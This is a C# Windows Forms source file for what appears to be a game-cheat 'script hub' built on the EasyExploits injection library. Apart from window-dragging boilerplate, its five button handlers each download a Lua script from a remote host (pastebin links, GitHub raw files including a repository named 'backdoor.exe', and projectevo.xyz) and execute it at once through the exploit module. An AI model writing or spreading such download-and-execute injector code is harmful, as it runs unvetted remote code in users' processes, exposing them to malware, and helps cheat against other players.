using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Text;
using EasyExploits;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Womenwarezz
{
    public partial class scripthub : Form
    {
        Point lastPoint;
        public scripthub()
        {
            InitializeComponent();
        }

        EasyExploits.Module module = new EasyExploits.Module();

        private void panel1_Paint(object sender, PaintEventArgs e)
        {

        }

        private void scripthub_Load(object sender, EventArgs e)
        {

        }

        private void button9_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void button7_Click(object sender, EventArgs e)
        {
            this.Hide();
        }

        private void panel1_MouseDown(object sender, MouseEventArgs e)
        {
            lastPoint = new Point(e.X, e.Y);
        }

        private void panel1_MouseMove(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                this.Left += e.X - lastPoint.X;
                this.Top += e.Y - lastPoint.Y;
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("https://raw.githubusercontent.com/NighterEpic/Faded-Grid/main/YesEpic");
            module.ExecuteScript(Script);
        }

        private void button2_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua");
            module.ExecuteScript(Script);
        }

        private void button3_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("https://pastebin.com/raw/HFkyyd1H");
            module.ExecuteScript(Script);
        }

        private void button4_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("https://projectevo.xyz/script/loader.lua");
            module.ExecuteScript(Script);
        }

        private void button5_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("https://pastebin.com/raw/zMrZEyJk");
            module.ExecuteScript(Script);
        }
    }
}
